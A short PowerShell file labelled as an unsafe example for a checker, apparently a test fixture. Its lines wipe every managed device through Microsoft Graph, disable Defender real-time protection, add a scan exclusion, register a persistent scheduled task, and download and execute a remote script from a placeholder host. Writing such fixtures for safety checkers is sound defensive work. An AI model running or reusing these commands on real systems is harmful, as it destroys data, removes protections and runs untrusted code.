# UNSAFE EXAMPLE for the checker. Fictional estate. Do not run.
Connect-MgGraph -Scopes "DeviceManagementManagedDevices.PrivilegedOperations.All" -NoWelcome
foreach ($d in (Get-MgDeviceManagementManagedDevice -All)) {
    Clear-MgDeviceManagementManagedDevice -ManagedDeviceId $d.Id
}
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Temp"
Register-ScheduledTask -TaskName "Cleanup" -Action (New-ScheduledTaskAction -Execute "cleanup.exe") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am)
iex (iwr https://scripts.example.invalid/tools.ps1)
